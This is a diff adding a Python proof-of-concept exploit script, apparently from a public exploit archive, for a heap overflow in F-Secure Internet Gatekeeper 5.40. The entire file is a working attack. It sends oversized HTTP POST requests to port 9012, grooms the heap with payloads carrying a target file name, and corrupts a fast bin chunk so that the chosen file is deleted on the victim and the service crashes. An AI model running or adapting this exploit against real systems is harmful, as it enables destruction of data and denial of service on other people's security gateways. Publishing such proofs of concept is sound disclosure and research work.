@@ -1,0 +1,62 @@
+# Title: F-Secure Internet Gatekeeper 5.40 - Heap Overflow (PoC)
+# Date: 2020-01-30
+# Author: Kevin Joensen
+# Vendor: F-Secure
+# Software: https://www.f-secure.com/en/business/downloads/internet-gatekeeper
+# CVE: N/A
+# Reference: https://blog.doyensec.com/2020/02/03/heap-exploit.html
+
+from pwn import *
+import time
+import sys
+
+
+
+def send_payload(payload, content_len=21487483844, nofun=False):
+    r = remote(sys.argv[1], 9012)
+    r.send("POST / HTTP/1.1\n")
+    r.send("Host: 192.168.0.122:9012\n")
+    r.send("Content-Length: {}\n".format(content_len))
+    r.send("\n")
+    r.send(payload)
+    if not nofun:
+        r.send("\n\n")
+    return r
+
+
+def trigger_exploit():
+    print "Triggering exploit"
+    payload = ""
+    payload += "A" * 12             # Padding
+    payload += p32(0x1d)            # Fast bin chunk overwrite
+    payload += "A"* 488             # Padding
+    payload += p32(0xdda00771)      # Address of payload
+    payload += p32(0xdda00771+4)    # Junk
+    r = send_payload(payload)
+
+
+
+def massage_heap(filename):
+        print "Trying to massage the heap....."
+        for x in xrange(100):
+            payload = ""
+            payload += p32(0x0)             # Needed to bypass checks
+            payload += p32(0x0)             # Needed to bypass checks
+            payload += p32(0xdda0077d)      # Points to where the filename will be in memory
+            payload += filename + "\x00"
+            payload += "C"*(0x300-len(payload))
+            r = send_payload(payload, content_len=0x80000, nofun=True)
+            r.close()
+            cut_conn = True
+        print "Heap massage done"
+
+
+if __name__ == "__main__":
+    if len(sys.argv) != 3:
+        print "Usage: ./{} <victim_ip> <file_to_remove>".format(sys.argv[0])
+        print "Run `export PWNLIB_SILENT=1` for disabling verbose connections"
+        exit()
+    massage_heap(sys.argv[2])
+    time.sleep(1)
+    trigger_exploit()
+    print "Exploit finished. {} is now removed and remote process should be crashed".format(sys.argv[2])
